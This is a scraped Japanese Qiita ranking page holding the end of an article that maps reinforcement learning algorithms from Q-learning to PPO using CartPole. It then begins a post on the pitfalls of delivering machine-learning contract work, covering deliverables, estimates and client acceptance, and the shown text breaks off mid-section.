<p>「何かの制御」であれば、先ほどのぶつからない自動運転技術の開発や、サーバールームの空調代金を安く抑える空調の制御手法の開発、共有サーバーの資源の最適配分、ロボットの運動制御などがあります。<br>
また最近では、文章生成などにも使われたりしています。</p>

<p>基本的に作りたいもののゴールは設定できるけど、そのゴールを達成するための手法・ルール・制御をうまく設計できない場合に、強化学習が使われています。</p>

<p>「対戦型ゲームのアルゴリズム」では、アルファ碁やアルファ碁ゼロに強化学習が使われています。</p>

<p>本記事では「対戦型ゲーム」は取り扱っておらず、どちらかというと、「何かの制御」に使われる強化学習アルゴリズムを紹介します。</p>

<h1>
<span id="強化学習の例題" class="fragment"></span><a href="#%E5%BC%B7%E5%8C%96%E5%AD%A6%E7%BF%92%E3%81%AE%E4%BE%8B%E9%A1%8C"><i class="fa fa-link"></i></a>強化学習の例題</h1>

<p>強化学習の例題としては、単純な迷路課題や3目並べなども使われますが、OpenAIのCartPoleが最もおすすめです。</p>

<p>CartPoleは以下のような、倒立振子の制御問題です。</p>

<p><a href="https://camo.qiitausercontent.com/2290b5df1644ed62fcfb40e6bbbb26792bc06d26/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39653961613431662d343534642d363738312d643432392d6533303366383564316138332e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/2290b5df1644ed62fcfb40e6bbbb26792bc06d26/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39653961613431662d343534642d363738312d643432392d6533303366383564316138332e676966" alt="openaigym.video.0.2643.video000000.gif" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/9e9aa41f-454d-6781-d429-e303f85d1a83.gif"></a></p>

<p>CartPoleをおすすめする理由は、動画で動きが見れて楽しいのと、適度な複雑さがあるからです。<br>
一方で使用するのは非常に簡単です。</p>

<p>このCartPoleは、小学生が掃除の時間にほうきを手のひらで立てて遊ぶのと同じ事をしています。</p>

<p>各時刻step=tで選択できる行動a(t)は、土台の車を（右に押す, 左に押す）の2択です。<br>
そして、状態s(t)は土台の車の位置x(t)、速度v(t)と、棒の角度θ(t)と角速度ω(t)の4変数です。</p>

<p>やりたいことは、状態s(t)に応じて適切な行動a(t)を実行し、棒を立て続けることです。</p>

<p>本記事ではこのCartPoleを対象に各アルゴリズムの実装を行いました。</p>

<p>それでは次に、各アルゴリズムを紹介します。</p>

<h1>
<span id="deep-learningが生まれる前までの強化学習" class="fragment"></span><a href="#deep-learning%E3%81%8C%E7%94%9F%E3%81%BE%E3%82%8C%E3%82%8B%E5%89%8D%E3%81%BE%E3%81%A7%E3%81%AE%E5%BC%B7%E5%8C%96%E5%AD%A6%E7%BF%92"><i class="fa fa-link"></i></a>Deep Learningが生まれる前までの強化学習</h1>

<p>強化学習において、Deep Learningが提案される前までのアルゴリズムには、代表的な手法が3つあります。<br>
Q-Learning、SARSA、モンテカルロ法です。</p>

<p><a href="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" alt="RLmap.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/9bbafddb-7b2b-e26b-994e-a97e9b4b497d.png"></a></p>

<h2>
<span id="q-learning" class="fragment"></span><a href="#q-learning"><i class="fa fa-link"></i></a>Q-Learning</h2>

<p>Q-Learning（Q学習）は、最も代表的な手法になります。<br>
まずはこの手法から勉強するのが良いです。</p>

<p>Q-LearningではQ関数と呼ばれる行動価値関数を学習し、制御を実現します。<br>
行動価値関数Q(a|s)とは、状態s(t)のときに行動aを行ったときに、その先どれくらいの報酬がもらえそうかを出力する関数です。</p>

<p>このQ関数に行動右に押すと、左に押すを入力したときの出力を比べ、報酬が多いほうを選べば、自然とCartPoleが立ち続けることになります。</p>

<p>以下の記事で、openAIのCartPoleの使用方法からQ-Learningのアルゴリズム詳細と実装例までを紹介しているので、まずはこちちらをご覧ください。</p>

<p>●<a href="http://neuro-educator.com/rl1/" rel="nofollow noopener" target="_blank">CartPoleでQ学習（Q-learning）を実装・解説【Phythonで強化学習：第1回】</a></p>

<h2>
<span id="sarsaモンテカルロ法" class="fragment"></span><a href="#sarsa%E3%83%A2%E3%83%B3%E3%83%86%E3%82%AB%E3%83%AB%E3%83%AD%E6%B3%95"><i class="fa fa-link"></i></a>SARSA、モンテカルロ法</h2>

<p>SARSAはQ-Learningと同様にQ関数を学習するのですが、少し学習の仕方が異なる手法です。</p>

<p>Q-LearningやSARSAは1stepごとにQ関数を学習していく手法です。<br>
それらとは異なり、CartPoleが倒れるまで行動し、その行動履歴からQ関数を学習する手法がモンテカルロ法です。</p>

<p>今回のマップではモンテカルロ法から進展しているアルゴリズムはありませんが、重要なアルゴリズムです。</p>

<p>SARSAとモンテカルロ法のアルゴリズム詳細と、CartPoleで実装した例を、次の記事にまとめましたので、詳細はこちらをご覧ください。</p>

<p>●<a href="https://qiita.com/sugulu/items/7a14117bbd3d926eb1f2" id="reference-c9a85a9bc8bc794a719c">シンプルな実装例で学ぶSARSA法およびモンテカルロ法【CartPoleで棒立て：1ファイルで完結】</a></p>

<p>Deep Learningが生まれる前までの強化学習手法としては、この3つが実装できれば良いのではと思います。</p>

<h1>
<span id="deep-learningが生まれてからの強化学習" class="fragment"></span><a href="#deep-learning%E3%81%8C%E7%94%9F%E3%81%BE%E3%82%8C%E3%81%A6%E3%81%8B%E3%82%89%E3%81%AE%E5%BC%B7%E5%8C%96%E5%AD%A6%E7%BF%92"><i class="fa fa-link"></i></a>Deep Learningが生まれてからの強化学習</h1>

<p>Deep Learningの出現にともない、強化学習にもDeep Learningが使われるようになり、ブレイクスルーが生まれました。</p>

<p><a href="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" alt="RLmap.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/9bbafddb-7b2b-e26b-994e-a97e9b4b497d.png"></a></p>

<h2>
<span id="dqnddqn" class="fragment"></span><a href="#dqnddqn"><i class="fa fa-link"></i></a>DQN、DDQN</h2>

<p>これまでQ関数を表すのに、実際には表を使用していました。<br>
表のサイズが、「状態sを離散化した数」×「行動の種類」となります。</p>

<p>ですが、表ではサイズに限りがあるため、ニューラルネットワークを使用したかったのですが、うまくいっていませんでした。</p>

<p>そこでQ関数の表現にDeep Learningを使用したのがDQN(Deep Q-Network もしくは Deep Q-Learning Network)です。</p>

<p>DQNの出現により、より複雑なゲームや制御問題の解決が可能になり、強化学習が注目を集めました。<br>
なおDeep Learning（深層学習）を用いた強化学習は、深層強化学習とも呼ばれます。</p>

<p>またDQNの学習で、2つのQ-networkを使用する手法をDouble DQN（DDQN）と呼びます。</p>

<p>DQN、DDQNのアルゴリズム詳細とCartPoleを実装した例を、以下にまとめましたのでご覧ください。</p>

<p>●<a href="http://neuro-educator.com/rl2/" rel="nofollow noopener" target="_blank">CartPoleでDQN（deep Q-learning）、DDQNを実装・解説【Phythonで強化学習：第2回】</a></p>

<h2>
<span id="prioritized-experience-replaydueling-dqn" class="fragment"></span><a href="#prioritized-experience-replaydueling-dqn"><i class="fa fa-link"></i></a>prioritized experience replay、Dueling DQN</h2>

<p>DDQNをより良くするために、prioritized experience replayやDueling DQNが提案されました。</p>

<p>prioritized experience replayは、Q学習がまだ進んでいない状態s(t)の経験に対して、優先的に学習を実行させる手法です。</p>

<p><a href="https://camo.qiitausercontent.com/24ed68017e14aff067edd297278780efc8a69648/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f36613934373430662d363661322d393761382d383265642d3732653538353638323836622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/24ed68017e14aff067edd297278780efc8a69648/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f36613934373430662d363661322d393761382d383265642d3732653538353638323836622e706e67" alt="pri.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/6a94740f-66a2-97a8-82ed-72e58568286b.png"></a></p>

<p>こちらでアルゴリズム詳細と実装例を紹介しています。</p>

<p>●<a href="https://qiita.com/sugulu/items/10ac7ce53de40d4c8891" id="reference-908ef97e8e8202feaeac">実装例から学ぶ優先順位付き経験再生 prioritized experience replay DQN </a></p>

<p>Dueling DQNは、Q関数を状態価値関数V(s)とAdvantage関数A(a|s)に分割して学習するネットワークを使用する手法です。</p>

<p>Q(a|s) = V(s) + A(a|s)</p>

<p>となります。</p>

<p>ネットワークで表すと以下の図の通りです。</p>

<p><a href="https://camo.qiitausercontent.com/a3ddc9965aa79398faaa075520a325739438f954/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f65383662393931382d303137632d313536312d343430622d6639316534326630313463652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a3ddc9965aa79398faaa075520a325739438f954/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f65383662393931382d303137632d313536312d343430622d6639316534326630313463652e706e67" alt="duelingnetwork.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/e86b9918-017c-1561-440b-f91e42f014ce.png"></a></p>

<p>こうすることで、どんな行動のときもV(s)を学習するため、Q関数の学習が早く良くなります。</p>

<p>こちらでアルゴリズム詳細と実装例を紹介しています。</p>

<p>●<a href="https://qiita.com/sugulu/items/6c4d34446d4878cde61a" id="reference-1baa4d1b29ab02907d13">実装例から学ぶDueling Network DQN </a></p>

<h1>
<span id="a3cの登場" class="fragment"></span><a href="#a3c%E3%81%AE%E7%99%BB%E5%A0%B4"><i class="fa fa-link"></i></a>A3Cの登場</h1>

<p>DQNの登場後、さらに深層強化学習の性能を上げることになった重要な手法がA3Cです。</p>

<p><a href="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" alt="RLmap.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/9bbafddb-7b2b-e26b-994e-a97e9b4b497d.png"></a></p>

<h2>
<span id="a3c" class="fragment"></span><a href="#a3c"><i class="fa fa-link"></i></a>A3C</h2>

<p>A3Cとは「Asynchronous Advantage Actor-Critic」の略称です。</p>

<p>A3Cの前に、並列化してDQNを行う手法として、GORILA（General Reinforcement Learning Architecture）が提案されていました。</p>

<p>ゴリラ（GORILLA）ではないので、注意してください。</p>

<p>なお"GORILA Python"で画像検索すると、いままで脳で想像したことのない面白い画像があります。<br>
●<a href="https://www.google.co.jp/search?q=GORILLA+Python&amp;rlz=1C1VSNC_enJP591JP713&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=0ahUKEwj8yuXgn5XXAhUDXrwKHXAiCgMQ_AUICygC&amp;biw=1526&amp;bih=742" rel="nofollow noopener" target="_blank">"GORILA Python"で画像検索した結果</a></p>

<p>話が脱線しました。</p>

<p>A3Cは並列計算に加え、さらにAdvantageと呼ばれる報酬の計算方法を使用しています。</p>

<p>Advantageは報酬の計算を1step後ではなく、数ステップ後まで行動を実施して行う計算手法です。</p>

<p>さらにA3Cには、Actor-Criticと呼ばれるネットワークが使用されています。</p>

<p><a href="https://camo.qiitausercontent.com/3edcf3031f7ba912bebac04552fdb853e2404438/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f38613038656538372d303064332d386434332d303039612d3635346363393034303236652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/3edcf3031f7ba912bebac04552fdb853e2404438/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f38613038656538372d303064332d386434332d303039612d3635346363393034303236652e706e67" alt="acnet.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/8a08ee87-00d3-8d43-009a-654cc904026e.png"></a></p>

<p>これは、Q関数ではなく、方策関数π(s)=[p(右), p(左)]で直接、状態sに応じた行動を出力します。<br>
p(右)は状態sで右に押すほうが良い確率を示します。<br>
この部分をActorと呼びます。</p>

<p>さらに同時に、状態価値V(s)も学習させます。<br>
この部分をCriticと呼びます。</p>

<p>DQNから比べると大きく変わっているので、理解が難しいのですが、実際にゆっくり実装してみると理解が深まります。</p>

<p>A3Cのアルゴリズム詳細とCartPoleを実装した例を、以下にまとめましたのでご覧ください。</p>

<p>●<a href="https://qiita.com/sugulu/items/acbc909dd9b74b043e45" id="reference-5f5fcab62be049bc415f">実装しながら学ぶA3C【CartPoleで棒立て：1ファイルで完結】</a></p>

<h2>
<span id="trpogeneralized-advantage-estimator" class="fragment"></span><a href="#trpogeneralized-advantage-estimator"><i class="fa fa-link"></i></a>TRPO、Generalized Advantage Estimator</h2>

<p>その他、強化学習のアルゴリズムとしてはA3Cとほぼ同時期に、TRPOやGAEなども提案されています。</p>

<p>TRPO(Trust Region Policy Optimization)は、方策関数π(s)が一度に大きく更新されすぎないように制限をかけて、方策関数π(s)を更新する手法です。</p>

<p>また、GAE（Generalized Advantage Estimator）という手法は、Advantageを考慮して報酬を計算する際に、どの程度先のステップまで考慮するのかを、1つの式で一般的に表せるようにした枠組みです。</p>

<h1>
<span id="2017年最新の強化学習unrealppo" class="fragment"></span><a href="#2017%E5%B9%B4%E6%9C%80%E6%96%B0%E3%81%AE%E5%BC%B7%E5%8C%96%E5%AD%A6%E7%BF%92unrealppo"><i class="fa fa-link"></i></a>2017年最新の強化学習、UNREAL、PPO</h1>

<p><a href="https://www.amazon.co.jp/%E9%80%9F%E7%BF%92-%E5%BC%B7%E5%8C%96%E5%AD%A6%E7%BF%92-%E5%9F%BA%E7%A4%8E%E7%90%86%E8%AB%96%E3%81%A8%E3%82%A2%E3%83%AB%E3%82%B4%E3%83%AA%E3%82%BA%E3%83%A0-%E3%83%81%E3%83%A7%E3%83%90-%E3%82%B5%E3%83%91%E3%82%B7%E3%83%90%E3%83%AA/dp/4320124227" rel="nofollow noopener" target="_blank">速習 強化学習: 基礎理論とアルゴリズム（書籍）</a>では、以上のアルゴリズムが紹介されていましたが、2016年末から2017年に発表されたアルゴリズムのうち、UNREALとPPOはとくに重要な手法なので、紹介します。</p>

<p><a href="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" alt="RLmap.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/9bbafddb-7b2b-e26b-994e-a97e9b4b497d.png"></a></p>

<h2>
<span id="unreal" class="fragment"></span><a href="#unreal"><i class="fa fa-link"></i></a>UNREAL</h2>

<p>UNREALは、「UNsupervised REinforcement and Auxiliary Learning」（UNREAL：教師なしの強化および補助学習）の略称です。</p>

<p>Auxiliaryを日本語にすると、「補助の」という意味です。<br>
A3Cのネットワークに、直接の制御目的とは少し異なる補助タスクを組み込んで、補助タスクがうまくできるようになることで、本来のゴールへの制御もうまくなるという作戦です。</p>

<p>例えば、URENALの論文では「3次元空間の迷路タスク」の攻略に、3つの補助タスクを組み込んでいます。</p>

<p>1つ目は、ピクセルコントロールと呼ばれ、画像ピクセルが大きく変化する動きを補助タスクとして学習させることで、迷路を進みやすくし、動き方を学ばせています。</p>

<p>2つ目は、 prioritized experience replayを強化し、報酬がもらえたときの状態s(t)を多く学習させ、現在の状態s(t)から、将来の報酬を予測させる補助タスクを行っています。</p>

<p>3つ目は、A3Cでは状態価値V(s)を学ぶ際に、過去の経験をシャッフルしないのですが、シャッフルしたバージョンで状態価値V(s)を学ぶ補助タスクを行っています。</p>

<p>これらの補助タスクがうまくできるようになることで、本来のタスクと一部共有しているネットワークの重みが学習され、本来のタスクもうまくなる仕組みです。</p>

<h2>
<span id="ppo" class="fragment"></span><a href="#ppo"><i class="fa fa-link"></i></a>PPO</h2>

<p>PPOは、openAIから2017年に発表された手法で、UNREALよりも実装が簡単です。</p>

<p>方策関数π(s)の更新手法として、TRPOが提案されていましたが、TRPOは実装がややこしく、またA3CのActor-Criticなど、出力が複数種類あるネットワークに適用できないという課題がありました。</p>

<p>この点を解決したのがPPOです。</p>

<p>PPOではClippingと呼ばれ、π(s) / π(s_old)が大きく変化した場合には、一定の値にしてしまう操作（Clip）を行います。</p>

<p>例えば、π(s_old)が0.1なのにπ(s)が0.9となった場合には、π(s) / π(s_old) = 9ではなく、1.2などにしてしまい、π(s) / π(s_old)が1.2以上は全部1.2としてしまう操作をします。</p>

<p>こうすることで、TRPOとは異なる手法で、方策関数π(s)の更新が大きく変化しすぎるのを防ぎます。</p>

<p>PPOのアルゴリズム詳細とCartPoleを実装した例を、以下にまとめましたのでご覧ください。</p>

<p>●<a href="https://qiita.com/sugulu/items/8925d170f030878d6582" id="reference-2c478f21573c38dcf8d5">実装しながら学ぶPPO【CartPoleで棒立て：1ファイルで完結】</a></p>

<h1>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h1>

<p>以上、これから強化学習を勉強したい人に向けて、「どんなアルゴリズムがあるのか」、「どの順番で勉強すれば良いのか」を示した強化学習アルゴリズムの「学習マップ」を作成しました。</p>

<p>これから強化学習を勉強する方の参考になれば幸いです。</p>

<p>ご一読いただきまして、ありがとうございます。</p>

<p><a href="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9b942a6dfd0333cb71f42483e14750abe6cad154/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3139313430312f39626261666464622d376232622d653236622d393934652d6139376539623462343937642e706e67" alt="RLmap.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/191401/9bbafddb-7b2b-e26b-994e-a97e9b4b497d.png"></a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">7位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>613</kbd>
		<a target="_blank" href="https://qiita.com/yoshizaki_kkgk/items/fa8b45918445bb3e6dc3">機械学習案件を納品するのは、そんなに簡単な話じゃないから気をつけて</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-11-21<br />12:22:15</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/130181.html">yoshizaki_kkgk</a>(37件の記事)<br />(株式会社キカガク 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/130181/profile-images/1506322419">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Python]</b> <b>[Rails]</b> <b>[WebAPI]</b> <b>[機械学習]</b> <b>[docker]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>昨日のTwitterで書いたこちらが非常に反響を呼びました。</p>

<blockquote class="twitter-tweet">
<p>半年間かけたデータ解析の仕事が全くうまくいかなかった<br>今回の失敗は契約書に納品物を明記していなかったこと<br>機械学習の依頼は学習済みモデルのファイルを納品しただけでは、先方は検収できず、結果支払いを受けられない<br>この教訓をひとりでも多くの人に知ってもらいたい</p>— キカガク代表 吉崎亮介 (@yoshizaki_kkgk) <a href="https://twitter.com/yoshizaki_kkgk/status/932564375969284103?ref_src=twsrc%5Etfw" rel="nofollow noopener" target="_blank">2017年11月20日</a>
</blockquote>



<p>そうなんですよね。<br>
全く先方が悪いわけでもなく、私自身が「機械学習のお仕事＝解析」だと思いこんでいたことが失敗の始まり。</p>

<p>結局のところ、機械学習系のプロダクトを依頼されて、学習済みモデルを作成して即納品とはいかず、検証結果を示されないと検収できないよとなってしまうので、結局アプリケーション側まで組み込まないと納得感はないんですよね。<br>
この検証とは、訓練データと検証データを分けた時の、検証データに対する結果ではありませんよ？</p>

<p>実運用フェーズに載せた時にちゃんと動作するかといった検証なのです。</p>

<h1>
<span id="根本的な誤解" class="fragment"></span><a href="#%E6%A0%B9%E6%9C%AC%E7%9A%84%E3%81%AA%E8%AA%A4%E8%A7%A3"><i class="fa fa-link"></i></a>根本的な誤解</h1>

<p>私自身、機械学習のプロダクトを開発して運用するまでの流れを以下のように考えていました。</p>

<p><a href="https://camo.qiitausercontent.com/e12fb14cb087ccbf7d635faecd0d030735221779/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133303138312f34653838613734622d356363392d356332332d626533382d3465663934316235623763302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e12fb14cb087ccbf7d635faecd0d030735221779/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3133303138312f34653838613734622d356363392d356332332d626533382d3465663934316235623763302e706e67" alt="before.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/130181/4e88a74b-5cc9-5c23-be38-4ef941b5b7c0.png"></a></p>

<p>これまでの私は「機械学習と一口にいっても、その多くの仕事が<strong>データ整理</strong>や<strong>データの前処理</strong>に費やされており、機械学習だけを勉強しても実務に入ることができるエンジニアにはなれませんよ」とお伝えしていました。<br>
もちろん、今でもその言葉に間違いはないと確信しています。</p>

<p>しかし！</p>

<p>それだけではないのです。<br>
データ整理をするためにSQLがかけて、データの前処理をするためにPythonを書けて、データ解析をするために難解な数学とライブラリを駆使できても、結局だめなのです。</p>

<p>ビジネス上の納品とは最終的なゴールに達さない限り、８０点で良いものではありません。<br>
１００点以外納品はありえません。<br>
９９点でもだめです。<br>
お客様とすり合わせを行った仕様を１００％満たす製品を作って納品しないとだめなのです。</p>

<p>そう考えると、「人工知能（AI）・機械学習を使って何かしたい！」思っているお客様と協業していくためには、どのようなシチュエーションに遭遇するかをイメージしながら、ゴールを考えながら作っていかないと行けません。</p>

<h1>
<span id="お客様との商談シミュレーション" class="fragment"></span><a href="#%E3%81%8A%E5%AE%A2%E6%A7%98%E3%81%A8%E3%81%AE%E5%95%86%E8%AB%87%E3%82%B7%E3%83%9F%E3%83%A5%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>お客様との商談シミュレーション</h1>

<blockquote>
<p>先方「AIを使って○○したいんだけど、<strong>この仕事</strong>お願いできない？」</p>
</blockquote>

<p>※この段階で気をつけないといけないことが、<strong>この仕事</strong>の範囲を明確にしてからスタートしないと、ビジネス上の１００点を取ることがかなり厳しくなるということです。</p>

<blockquote>
<p>私「わかりました。では、目安として精度が○○%くらいといった目標はございますか？」</p>

<p>先方「○○％くらいは望ましいね〜。このぐらいいける？」</p>

<p>私「正直なところ、データを解析してみないとわかりませんね。。。」</p>

<p>先方「それはそうだと思うけど、<strong>肌感でどう</strong>？」</p>

<p>私「そのぐらいの精度であればであれば、達成できるような気がしますね。見極めのためにも、<strong>PoC</strong>（この業界の人がよく使う言葉で仮説検証のこと、Proof of Concept）を回してみませんか。」</p>

<p>先方「OK。いくらぐらいかかるの？」</p>
</blockquote>

<p>ここで、ストップです。<br>
「<strong>肌感でどう？</strong>」と私もよく聞く質問ではあるのですが、データ解析は実装して検証してみるまで、正直なんとも言えません。<br>
とは言え、その分野での解析に関する経験があれば、基準値が○○％とすぐに答えられるかもしれません。<br>
しかし、一旦言ってしまうと相手の期待値がそこまで上がってしまい、その期待値をなかなか下げることができないため、経験上それも言わないほうが良い気がしています（とは言え、未知のものに投資できないので、言わざるを得ないのですが、、、）。</p>

<p>そして、ここからが見積りの値段決めに入ります。</p>

<p>よくありがちな失敗としては、日頃解析業務を趣味等で行っており、<strong>ライブラリの使い方を把握</strong>されている方であれば、解析のテンプレートができているため、機械学習の実装に関しては１〜３日ほどあれば、実装完了して検証まで行えると思います。</p>

<p>しかし、お客様から受ける案件に関しては、<strong>データを解析するまでの道のりが非常に長い</strong>ことを忘れないようにしましょう。</p>

<p>その道程すべてを加味して、工程を分解し、そうしてようやく見積りを出すことができるため、絶対にその場で、<br>
「じゃあ３日間ぐらいでできるので○○万円でどうでしょう？」<br>
とは言わないように気をつけましょう。</p>

<h1>
<span id="例え話-情報収集先がwebサイトの場合" class="fragment"></span><a href="#%E4%BE%8B%E3%81%88%E8%A9%B1-%E6%83%85%E5%A0%B1%E5%8F%8E%E9%9B%86%E5%85%88%E3%81%8Cweb%E3%82%B5%E3%82%A4%E3%83%88%E3%81%AE%E5%A0%B4%E5%90%88"><i class="fa fa-link"></i></a>例え話. 情報収集先がWebサイトの場合</h1>

<h2>
<span id="依頼のはじまり" class="fragment"></span><a href="#%E4%BE%9D%E9%A0%BC%E3%81%AE%E3%81%AF%E3%81%98%E3%81%BE%E3%82%8A"><i class="fa fa-link"></i></a>依頼のはじまり</h2>

<p>例えば、データの収集先（Webサイト）を指定されて、ここのデータを使って解析してほしいと言われた場合、<br>
「あ、Webスクレイピングを最近勉強しているので、いけますよ！」<br>
と答えてしまいますが、本当にそれで良いのでしょうか？</p>

<p>このお仕事の工程を分解していきましょう。</p>

<table>
<thead>
<tr>
<th style="text-align: left">工程</th>
<th style="text-align: left">時間</th>
<th style="text-align: left">補足</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">Webスクレイピング</td>
<td style="text-align: left">○○日</td>
<td style="text-align: left">○○から○○の情報を取得</td>
</tr>
<tr>
<td style="text-align: left">データ前処理1</td>
<td style="text-align: left">○○日</td>
<td style="text-align: left"></td>
</tr>
<tr>
<td style="text-align: left">データ解析</td>
<td style="text-align: left">○○日</td>
<td style="text-align: left">まず大雑把に解析</td>
</tr>
<tr>
<td style="text-align: left">データ前処理2+解析</td>
<td style="text-align: left">○○日</td>
<td style="text-align: left">重要な特徴量探しと外部要因の検討</td>
</tr>
</tbody>
</table>

<p>と少し慣れている人だとこんな感じで考えるのではないでしょうか。<br>
ちゃんと前処理の日程も確保しつつ、解析をした後にさらに前処理の手戻りが発生することも考慮できているため、割と手堅い計画になっていると思います。</p>

<blockquote>
<p>私「では、このような日程で計画を立てたので、合計○○日で○○円でいかがでしょうか。」</p>

<p>先方「（おっ、結構高いな。AIエンジニアが高いとは聞いていたけれど、これほどまでとは。でも仕方ない。）わかりました。この金額で進めましょう。」</p>
</blockquote>

<p>では、このまま解析を行ってうまくいったとしましょう。</p>

<blockquote>
<p>私「先日依頼されておりました解析の結果がでました。まだPoC段階ですので、カリカリのチューニングとまでは手が及んでいませんが、訓練データに対して○○％の結果、検証データに対して○○％くらいの精度が出ましたね。基準としていたラインまでは達成できそうですね。」</p>

<p>先方「良いですね。この感じだと運用しながらさらにデータが集まっていくので、精度も上がっていき、かなり期待できますね。」</p>
</blockquote>

<p>となり、これで検収完了！支払いへGo!といけば良いのですが、そうはいきません。</p>

<p>みなさんも依頼側の立場に立って考えてもらうと分かるのですが、<br>
「これってアウトプットが報告書なので、信用はしているのですが、嘘か本当かがわかりません。」<br>
と思いますよね？</p>

<p>そりゃそうです。</p>

<p>そうなるとどうなるかというと、<strong>ちゃんと動作するまで、数日〜数ヶ月程度運用してみて、その様子を見たい</strong>という話になります。</p>

<p>何回も言いますが、そりゃそうです。</p>

<h2>
